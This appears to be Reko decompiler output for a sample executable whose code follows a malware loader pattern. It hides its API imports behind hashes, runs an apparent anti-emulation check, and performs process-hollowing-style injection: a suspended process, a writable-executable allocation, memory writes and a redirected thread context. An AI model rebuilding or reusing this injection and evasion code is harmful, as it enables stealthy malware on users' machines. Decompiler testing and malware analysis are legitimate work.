// subject_UPX0.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register word32 fn00401000(Stack Eq_3 dwArg04, Stack uint32 dwArg08)
// Called from:
//      fn0040130C
word32 fn00401000(Eq_3 dwArg04, uint32 dwArg08)
{
	word32 eax_25 = Mem17[Mem17[dwArg04 + 60:word32] + dwArg04 + 0x0078:word32] + dwArg04;
	word16 eax_28[] = dwArg04 + eax_25->dw0024 / 4;
	uint32 esi_134 = dwArg08;
	if (SetFileSecurityA(0x00, 0x00, null) != 0x00)
		esi_134 = dwArg08 + 550842;
	word32 eax_48[] = dwArg04 + eax_25->dw0020 / 4;
	word32 eax_52[] = dwArg04 + eax_25->dw001C / 4;
	int32 edx_105 = 0x00;
	while (true)
	{
		word32 eax_113;
		if (edx_105 >= eax_25->dw0018)
			break;
		int32 eax_68 = dwArg04 + eax_48[edx_105] / 4;
		byte dwLoc14_149[] = null;
		uint32 dwLoc18_150 = 0x00;
		while (dwLoc14_149[eax_68] != 0x00)
		{
			dwLoc18_150 = (int32) dwLoc14_149[eax_68] ^ 0x47 ^ (dwLoc18_150 << 0x07 | dwLoc18_150 >> 0x19);
			dwLoc14_149 = (byte (*)[]) (dwLoc14_149 + 1);
		}
		if (dwLoc18_150 == esi_134)
		{
			eax_113 = dwArg04 + eax_52[(word32) eax_28[edx_105]] / 4;
			return eax_113;
		}
		++edx_105;
	}
	eax_113 = 0x00;
	return eax_113;
}

// 0040130C: void fn0040130C()
void fn0040130C()
{
	Eq_88 tLoc24;
	lstrcpyA(&tLoc24, g_t403010.u0);
	Eq_3 eax_23 = LoadLibraryA(&tLoc24);
	Eq_3 ebx_25 = eax_23;
	if (eax_23 == null)
	{
		lstrcatA(&tLoc24, g_t40302C.u0);
		LoadLibraryA(&tLoc24);
		lstrcatA(&tLoc24, g_t403020.u0);
		ebx_25 = LoadLibraryA(&tLoc24);
	}
	g_ptr4037A8 = fn00401000(ebx_25, 3308750557);
	g_ptr4037AC = fn00401000(ebx_25, 0x19B9B4BC);
	g_ptr4037B0 = fn00401000(ebx_25, 509688883);
	g_ptr4037B4 = fn00401000(ebx_25, 689660713);
	g_ptr4037B8 = fn00401000(ebx_25, 689654569);
	g_ptr4037BC = fn00401000(ebx_25, 3305026339);
	g_ptr4037C0 = fn00401000(ebx_25, 3875476678);
	g_ptr4037C4 = fn00401000(ebx_25, 0x2AEEC701);
	g_ptr403194 = fn00401000(ebx_25, 2010811454);
	g_ptr403190 = fn00401000(ebx_25, 1423919133);
	g_ptr40318C = fn00401000(ebx_25, 1423642269);
	g_ptr4037C8 = fn00401000(ebx_25, 0x553E451D);
	g_ptr40319C = fn00401000(ebx_25, 1164480822);
	g_ptr403198 = fn00401000(ebx_25, 885916858);
	g_ptr4031A0 = fn00401000(ebx_25, 1049500871);
	g_ptr4037CC = fn00401000(ebx_25, 3079019788);
	g_ptr4037D0 = fn00401000(ebx_25, 809577528);
	g_ptr4037D4 = fn00401000(ebx_25, 3443547341);
	struct Eq_197 * esp_319;
	g_ptr40318C();
	esp_319->dwFFFFFFFC = g_dw403054;
	esp_319->ptrFFFFFFF8 = &tLoc24;
	struct Eq_208 * esp_331;
	g_ptr403190();
	esp_331->dwFFFFFFFC = g_dw403050;
	esp_331->ptrFFFFFFF8 = &tLoc24;
	struct Eq_219 * esp_343;
	g_ptr403190();
	esp_343->dwFFFFFFFC = g_dw40300C;
	esp_343->ptrFFFFFFF8 = &tLoc24;
	struct Eq_230 * esp_355;
	g_ptr403190();
	esp_355->ptrFFFFFFFC = &tLoc24;
	struct Eq_236 * esp_364;
	Eq_3 eax_365;
	g_ptr403194();
	esp_364->dwFFFFFFFC = 0x1419255C;
	esp_364->tFFFFFFF8 = eax_365;
	g_ptr4037D8 = fn00401000(esp_364->tFFFFFFF8, esp_364->dwFFFFFFFC);
	esp_364->dwFFFFFFFC = 3009360335;
	esp_364->tFFFFFFF8 = eax_365;
	g_ptr4037DC = fn00401000(esp_364->tFFFFFFF8, esp_364->dwFFFFFFFC);
	esp_364->dwFFFFFFFC = 0x3B7B3E60;
	esp_364->tFFFFFFF8 = eax_365;
	g_ptr4037E0 = fn00401000(esp_364->tFFFFFFF8, esp_364->dwFFFFFFFC);
	esp_364->dwFFFFFFFC = 2569513572;
	esp_364->tFFFFFFF8 = eax_365;
	g_ptr4037E4 = fn00401000(esp_364->tFFFFFFF8, esp_364->dwFFFFFFFC);
	esp_364->dwFFFFFFFC = 332757019;
	esp_364->tFFFFFFF8 = eax_365;
	g_ptr4037E8 = fn00401000(esp_364->tFFFFFFF8, esp_364->dwFFFFFFFC);
	esp_364->dwFFFFFFFC = g_dw403000;
	struct Eq_329 * esp_444;
	Eq_3 eax_445;
	g_ptr403194();
	esp_444->dwFFFFFFFC = 0xEC0DC481;
	esp_444->tFFFFFFF8 = eax_445;
	<anonymous> * eax_455 = fn00401000(esp_444->tFFFFFFF8, esp_444->dwFFFFFFFC);
	g_ptr4037EC = eax_455;
	fn0040172A(eax_455);
	esp_444->dwFFFFFFFC = 0x00;
	g_ptr4037C4();
}

// 0040172A: void fn0040172A(Register (ptr32 code) eax)
// Called from:
//      fn0040130C
void fn0040172A(<anonymous> * eax)
{
	ptr32 fp;
	struct Eq_386 * esp_30;
	word32 eax_31;
	g_ptr40318C();
	esp_30->dwFFFFFFFC = g_dw403004;
	esp_30->dwFFFFFFF8 = 0x004037F0;
	struct Eq_398 * esp_40;
	word32 eax_41;
	g_ptr403190();
	esp_40->dwFFFFFFFC = g_dw403044;
	esp_40->dwFFFFFFF8 = 0x004037F0;
	struct Eq_410 * esp_50;
	word32 eax_51;
	g_ptr403190();
	esp_50->dwFFFFFFFC = g_dw403048;
	esp_50->dwFFFFFFF8 = 0x004037F0;
	struct Eq_422 * esp_60;
	word32 eax_61;
	g_ptr403190();
	esp_60->dwFFFFFFFC = 4208884;
	esp_60->dwFFFFFFF8 = 0x004037F0;
	struct Eq_433 * esp_69;
	word32 eax_70;
	g_ptr403190();
	g_dw4039F8 = 0x44;
	g_dw403A24 = 0x01;
	g_w403A28 = 0x02;
	esp_69->dwFFFFFFFC = 4209212;
	esp_69->dwFFFFFFF8 = 4209144;
	esp_69->dwFFFFFFF4 = 0x00;
	esp_69->dwFFFFFFF0 = 0x00;
	esp_69->dwFFFFFFEC = 0x04;
	esp_69->dwFFFFFFE8 = 0x00;
	esp_69->dwFFFFFFE4 = 0x00;
	esp_69->dwFFFFFFE0 = 0x00;
	esp_69->dwFFFFFFDC = 0x004037F0;
	esp_69->dwFFFFFFD8 = 0x00;
	struct Eq_485 * esp_97;
	g_ptr4037A8();
	esp_97->tFFFFFFFC.u0 = 0x00;
	Eq_3 eax_104 = GetModuleHandleA(esp_97->tFFFFFFFC);
	int32 edx_107 = eax_104[0x0F];
	esp_97->tFFFFFFFC.u0 = 0x40;
	esp_97->dwFFFFFFF8 = 0x3000;
	Eq_511 eax_108 = eax_104 + edx_107 / 4;
	esp_97->dwFFFFFFF4 = (int32) eax_108[20];
	esp_97->tFFFFFFF0 = eax_104;
	esp_97->dwFFFFFFEC = g_dw403A3C;
	struct Eq_527 * esp_123;
	word32 eax_124;
	g_ptr4037AC();
	esp_123->ptrFFFFFFFC = fp - 8;
	esp_123->dwFFFFFFF8 = (int32) eax_108[20];
	esp_123->tFFFFFFF4 = eax_104;
	esp_123->dwFFFFFFF0 = eax_124;
	esp_123->dwFFFFFFEC = g_dw403A3C;
	struct Eq_551 * esp_141;
	word32 eax_142;
	g_ptr4037B0();
	g_dw403A4C = 0x00010007;
	esp_141->dwFFFFFFFC = 4209228;
	esp_141->dwFFFFFFF8 = g_dw403A40;
	struct Eq_566 * esp_152;
	g_ptr4037B4();
	g_dw403B04 = 0x004010C4;
	esp_152->dwFFFFFFFC = 4209228;
	esp_152->dwFFFFFFF8 = g_dw403A40;
	struct Eq_579 * esp_164;
	word32 eax_165;
	g_ptr4037B8();
	esp_164->dwFFFFFFFC = g_dw403A40;
	g_ptr4037BC();
}

CHAR g_str4020A7[] = "ne"; // 004020A7
CHAR g_str4020B1[] = "l32.dll"; // 004020B1
CHAR g_str4020DB[] = "ker"; // 004020DB
uint32 g_dw403000 = 0x004020EA; // 00403000
word32 g_dw403004 = 4202727; // 00403004
word32 g_dw40300C = 0x004020DF; // 0040300C
Eq_22 g_t403010 = // 00403010
	{
		&g_str4020DB
	};
Eq_22 g_t403020 = // 00403020
	{
		&g_str4020B1
	};
Eq_22 g_t40302C = // 0040302C
	{
		&g_str4020A7
	};
word32 g_dw403044 = 4202646; // 00403044
word32 g_dw403048 = 0x00402091; // 00403048
word32 g_dw403050 = 0x00402005; // 00403050
word32 g_dw403054 = 0x00402002; // 00403054
<anonymous> * g_ptr40318C = null; // 0040318C
<anonymous> * g_ptr403190 = null; // 00403190
<anonymous> * g_ptr403194 = null; // 00403194
<anonymous> * g_ptr403198 = null; // 00403198
<anonymous> * g_ptr40319C = null; // 0040319C
<anonymous> * g_ptr4031A0 = null; // 004031A0
<anonymous> * g_ptr4037A8 = null; // 004037A8
<anonymous> * g_ptr4037AC = null; // 004037AC
<anonymous> * g_ptr4037B0 = null; // 004037B0
<anonymous> * g_ptr4037B4 = null; // 004037B4
<anonymous> * g_ptr4037B8 = null; // 004037B8
<anonymous> * g_ptr4037BC = null; // 004037BC
<anonymous> * g_ptr4037C0 = null; // 004037C0
<anonymous> * g_ptr4037C4 = null; // 004037C4
<anonymous> * g_ptr4037C8 = null; // 004037C8
<anonymous> * g_ptr4037CC = null; // 004037CC
<anonymous> * g_ptr4037D0 = null; // 004037D0
<anonymous> * g_ptr4037D4 = null; // 004037D4
<anonymous> * g_ptr4037D8 = null; // 004037D8
<anonymous> * g_ptr4037DC = null; // 004037DC
<anonymous> * g_ptr4037E0 = null; // 004037E0
<anonymous> * g_ptr4037E4 = null; // 004037E4
<anonymous> * g_ptr4037E8 = null; // 004037E8
<anonymous> * g_ptr4037EC = null; // 004037EC
word32 g_dw4039F8 = 0x00; // 004039F8
word32 g_dw403A24 = 0x00; // 00403A24
word16 g_w403A28 = 0x00; // 00403A28
word32 g_dw403A3C = 0x00; // 00403A3C
word32 g_dw403A40 = 0x00; // 00403A40
word32 g_dw403A4C = 0x00; // 00403A4C
word32 g_dw403B04 = 0x00; // 00403B04
